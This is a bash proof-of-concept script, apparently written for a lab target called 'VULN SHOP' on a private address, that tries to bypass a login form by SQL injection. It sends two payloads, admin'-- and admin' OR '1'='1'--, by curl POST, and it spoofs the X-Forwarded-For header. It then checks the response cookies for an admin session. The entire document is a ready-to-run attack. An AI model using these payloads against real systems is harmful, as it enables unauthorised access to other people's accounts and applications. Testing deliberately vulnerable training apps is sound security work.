#!/bin/bash
# SQL Injection Login Bypass PoC
# Target: VULN SHOP

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] SQL Injection Login Bypass Test"
echo "[*] Target: $TARGET"
echo ""

# Payload 1: Basic comment injection
echo "[+] Testing: admin'--"
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=test" \
  "$TARGET/login" -v 2>&1 | grep -E "(Set-Cookie|Location)"

echo ""

# Payload 2: OR-based injection
echo "[+] Testing: admin' OR '1'='1'--"
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1'--&password=test" \
  "$TARGET/login" -v 2>&1 | grep -E "(Set-Cookie|Location)"

echo ""
echo "[*] If Set-Cookie contains 'user=admin', login bypass successful!"
